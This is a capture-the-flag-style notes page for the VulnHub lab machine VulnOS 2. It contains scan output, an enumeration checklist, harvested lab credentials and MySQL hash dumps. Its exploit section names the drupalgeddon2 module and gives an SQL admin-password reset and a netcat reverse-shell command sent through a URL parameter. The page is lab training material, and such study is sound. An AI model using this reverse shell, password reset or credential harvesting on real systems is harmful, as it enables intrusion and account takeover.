BOX NAME: VulnOS 2
LINK: https://www.vulnhub.com/entry/vulnos-2,147/

IP=192.168.0.165
URL=http://192.168.0.165

# Credentials:

\[+\] vulnosadmin

\[+\] drupal7:toor (mySQL)

\[+\] root:toor (mySQL)

\[+\] webmin: webmin1980

\[+\] guest:guest

# Hashes:

\[+\]

# Remote Enumeration:

### Host Discovery

```
urrently scanning: Finished!   |   Screen View: Unique Hosts                                                     
                                                                                                                   
 28 Captured ARP Req/Rep packets, from 9 hosts.   Total size: 1680                                                 
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.165   08:00:27:a2:7d:17      2     120  PCS Systemtechnik GmbH
```

### Nmap scan

```
└─# nmap -n -A $IP                       
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-14 15:08 EST
Nmap scan report for 192.168.0.165
Host is up (0.00031s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 f54dc8e78bc1b2119524fd0e4c3c3b3b (DSA)
|   2048 ff19337ac1eeb5d0dc6651daf06efc48 (RSA)
|   256 aed76fcced4a828be866a5117a115f86 (ECDSA)
|_  256 71bc6b7b5602a48ece1c8ea61e3a3794 (ED25519)
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: VulnOSv2
|_http-server-header: Apache/2.4.7 (Ubuntu)
6667/tcp open  irc     ngircd
MAC Address: 08:00:27:A2:7D:17 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.31 ms 192.168.0.165
```

# Hosts and computers:

\[+\] HOSTS:
\[+\] FQDN:
\[+\] COMPUTER NAME:
\[+\] OS:

# LOOK AT IT!:

\[+\]

# Special searchsploit findings:

\[+\] Port 21 \[FTP\]
\[+\] Port 22 \[SSH\]
\[+\] Port 23 \[TELNET\]
\[+\] Port 25 \[SMTP\]
\[+\] Port 53 \[DNS\]
\[+\] Port 80 \[HTTP\]
\[+\] Port 88 \[Kerberos\]
\[+\] Port 110 \[POP3\]
\[+\] Port 111 \[NFS\]
\[+\] Port 137 \[NETBIOS\]
\[+\] Port 139 \[NETBIOS\]
\[+\] Port 143 \[IMAP\]
\[+\] Port 443 \[HTTPS\]
\[+\] Port 445 \[SAMBA\]
\[+\] Port 464 \[Kerberos\]
\[+\] Port 465 \[SMTP\]
\[+\] Port 631 \[CUPS\]
\[+\] Port 587 \[SMTP /SSL\]
\[+\] Port 993 \[IMAP /SSL\]
\[+\] Port 995 \[POP3 /SSL\]
\[+\] Port 1194 \[OPENVPN\]
\[+\] Port 2049 \[NFS\]
\[+\] Port 3306 \[MySQL\]
\[+\] Port 5432 \[PostgreSQL\]
\[+\] Port 5900 \[VNC\]
\[+\] Port 5901 \[VNC\]
\[+\] Port 6001 \[X-SERVER\]
\[+\] Port 6667 \[IRC\]
\[+\] Port 6668 \[IRC\]
\[+\] Port 6669 \[IRC\]
\[+\] Port 6881 \[TORRENT\]
\[+\] Port 8080 \[HTTP\]

# FTP:

\[+\] ftp anonyomus@$IP

# SMB:

\[+\] smbclient -L $IP

# NFS:

\[+\] showmount -e $IP
\[+\] mount -t nfs $IP:/remote/folder local/folder

# SMTP:

\[+\] smtp-user-enum -U users.txt -t $IP

# HTTP/HTTPS:

\[+\] feroxbuster -u $IP -d 1

\[+\] gobuster dir http://IP\[+\]gobustervhosthttp://IP \[+\] gobuster vhost http://IP\[+\]gobustervhosthttp://IP

\[+\] Nikto --url http://$IP -C all

\[+\] ffuf -u '$URL/FUZZ' -w wordlist.txt -fs filtersize

# enum4linux:

\[+\] enum4linux -A $IP

# CMS:

\[+\] cmseek -u http://$IP --random-agent

```
___ _  _ ____ ____ ____ _  _
|    |\/| [__  |___ |___ |_/  by @r3dhax0r
|___ |  | ___| |___ |___ | \_ Version 1.1.3 K-RONA


 [+]  CMS Scan Results  [+] 

 ┏━Target: 192.168.0.165
 ┃
 ┠── CMS: Drupal
 ┃    │
 ┃    ├── Version: 7
 ┃    ╰── URL: https://drupal.org
 ┃
 ┠── Result: /usr/share/cmseek/Result/192.168.0.165_jabc/cms.json
 ┃
 ┗━Scan Completed in 0.06 Seconds, using 1 Requests



 CMSeeK says ~ Fir milenge
```

\[+\] wpscan -u $IP

\[+\] droopescan -u $IP

```
└─# droopescan scan drupal -u $URL/jabc
[+] Plugins found:                                                              
    ctools http://192.168.0.165/jabc/sites/all/modules/ctools/
        http://192.168.0.165/jabc/sites/all/modules/ctools/CHANGELOG.txt
        http://192.168.0.165/jabc/sites/all/modules/ctools/LICENSE.txt
        http://192.168.0.165/jabc/sites/all/modules/ctools/API.txt
    token http://192.168.0.165/jabc/sites/all/modules/token/
        http://192.168.0.165/jabc/sites/all/modules/token/README.txt
        http://192.168.0.165/jabc/sites/all/modules/token/LICENSE.txt
    views http://192.168.0.165/jabc/sites/all/modules/views/
        http://192.168.0.165/jabc/sites/all/modules/views/README.txt
        http://192.168.0.165/jabc/sites/all/modules/views/LICENSE.txt
    libraries http://192.168.0.165/jabc/sites/all/modules/libraries/
        http://192.168.0.165/jabc/sites/all/modules/libraries/CHANGELOG.txt
        http://192.168.0.165/jabc/sites/all/modules/libraries/README.txt
        http://192.168.0.165/jabc/sites/all/modules/libraries/LICENSE.txt
    entity http://192.168.0.165/jabc/sites/all/modules/entity/
        http://192.168.0.165/jabc/sites/all/modules/entity/README.txt
        http://192.168.0.165/jabc/sites/all/modules/entity/LICENSE.txt
    ckeditor http://192.168.0.165/jabc/sites/all/modules/ckeditor/
        http://192.168.0.165/jabc/sites/all/modules/ckeditor/CHANGELOG.txt
        http://192.168.0.165/jabc/sites/all/modules/ckeditor/README.txt
        http://192.168.0.165/jabc/sites/all/modules/ckeditor/LICENSE.txt
    rules http://192.168.0.165/jabc/sites/all/modules/rules/
        http://192.168.0.165/jabc/sites/all/modules/rules/README.txt
        http://192.168.0.165/jabc/sites/all/modules/rules/LICENSE.txt
    addressfield http://192.168.0.165/jabc/sites/all/modules/addressfield/
        http://192.168.0.165/jabc/sites/all/modules/addressfield/LICENSE.txt
    plupload http://192.168.0.165/jabc/sites/all/modules/plupload/
        http://192.168.0.165/jabc/sites/all/modules/plupload/CHANGELOG.txt
        http://192.168.0.165/jabc/sites/all/modules/plupload/README.txt
        http://192.168.0.165/jabc/sites/all/modules/plupload/LICENSE.txt
    commerce http://192.168.0.165/jabc/sites/all/modules/commerce/
        http://192.168.0.165/jabc/sites/all/modules/commerce/README.txt
        http://192.168.0.165/jabc/sites/all/modules/commerce/LICENSE.txt
    profile http://192.168.0.165/jabc/modules/profile/
    php http://192.168.0.165/jabc/modules/php/
    image http://192.168.0.165/jabc/modules/image/

[+] Themes found:
    seven http://192.168.0.165/jabc/themes/seven/
    garland http://192.168.0.165/jabc/themes/garland/

[+] Possible version(s):
    7.22
    7.23
    7.24
    7.25
    7.26

[+] No interesting urls found.

[+] Scan finished (0:00:10.851023 elapsed)
```

\[+\] joomscan -u $IP -ec

# Local Filesystem Findings:

\[+\] FILES OF INTEREST

\[+\] SUID

\[+\] SGID

\[+\] Dumps, outputs, other useful information

```
driver' => 'mysql',
        'database' => 'drupal7',
        'username' => 'drupal7',
        'password' => 'toor',
        'host' => 'localhost',
        'port' => '',
        'prefix' => ''
```

```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for [OpenDocMan */
define('DB_NAME', 'jabcd0cs');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASS', 'toor');
```

# \# jabd0cs mysql DUMPS

```
mysql> select * from odm_user;
+----+----------+----------------------------------+------------+-------------+--------------------+-----------+------------+---------------+
| id | username | password                         | department | phone       | Email              | last_name | first_name | pw_reset_code |
+----+----------+----------------------------------+------------+-------------+--------------------+-----------+------------+---------------+
|  1 | webmin   | b78aae356709f8c31118ea613980954b |          2 | 5555551212  | webmin@example.com | min       | web        |               |
|  2 | guest    | 084e0343a0486ff05530df6c705c8bb4 |          2 | 555 5555555 | guest@example.com  | guest     | guest      | NULL          |
+----+----------+----------------------------------+------------+-------------+--------------------+-----------+------------+---------------+
```

# \# drupal7 mysql DUMPS

```
+-----+--------+---------------------------------------------------------+--------------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------+----------+---------+--------------------------+------+
| uid | name   | pass                                                    | mail                     | theme | signature | signature_format | created    | access     | login      | status | timezone      | language | picture | init                     | data |
+-----+--------+---------------------------------------------------------+--------------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------+----------+---------+--------------------------+------+
|   0 |        |                                                         |                          |       |           | NULL             |          0 |          0 |          0 |      0 | NULL          |          |       0 |                          | NULL |
|   1 | webmin | $S$DPc41p2JwLXR6vgPCi.jC7WnRMkw3Zge3pVoJFnOn6gfMfsOr/Ug | VulnOSv2@localdomain.com |       |           | NULL             | 1460812762 | 1462351302 | 1462351302 |      1 | Europe/Berlin |          |       0 | VulnOSv2@localdomain.com | b:0; |
+-----+--------+---------------------------------------------------------+--------------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------+----------+---------+--------------------------+------+
```

# \# mysql mysql DUMPS

```
+-----------+------------------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+
| Host      | User             | Password                                  | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin | authentication_string |
+-----------+------------------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+
| localhost | root             | *9CFBBC772F3F6C106020035386DA5BBBF1249A11 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |
| vulnosv2  | root             | *9CFBBC772F3F6C106020035386DA5BBBF1249A11 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |
| 127.0.0.1 | root             | *9CFBBC772F3F6C106020035386DA5BBBF1249A11 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |
| ::1       | root             | *9CFBBC772F3F6C106020035386DA5BBBF1249A11 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |
| localhost | debian-sys-maint | *6BC5901B87B5DF07E1C2BA75C15C537EB6B4078B | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        | NULL                  |
| localhost | phpmyadmin       | *9CFBBC772F3F6C106020035386DA5BBBF1249A11 | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 |        | NULL                  |
| localhost | drupal7          | *9CFBBC772F3F6C106020035386DA5BBBF1249A11 | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 |        | NULL                  |
+-----------+------------------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+
```

# Kernel Info:

\[+\] file /bin/bash | lsb_release -a | uname -a

# Exploits and Payloads:

\[+\] unix/webapp/drupal_drupalgeddon2

```#bash
# change password in mysql db
UPDATE odm_user SET password = MD5("pwned") WHERE ID=1 LIMIT 1;


#Reverse shell
192.168.0.166/jabc/?q=node/9&cmd=nc 192.168.0.163 7777 -e /bin/bash
```

Writeup:

==DIARY==

```
Started with ...
```

==PROOF==

```
Hello and welcome.
You successfully compromised the company "JABC" and the server completely !!
Congratulations !!!
Hope you enjoyed it.

What do you think of A.I.?
```

![a6a7c1dbbf4f4e471f12bf3ead5d83f2.png](../../_resources/a6a7c1dbbf4f4e471f12bf3ead5d83f2.png)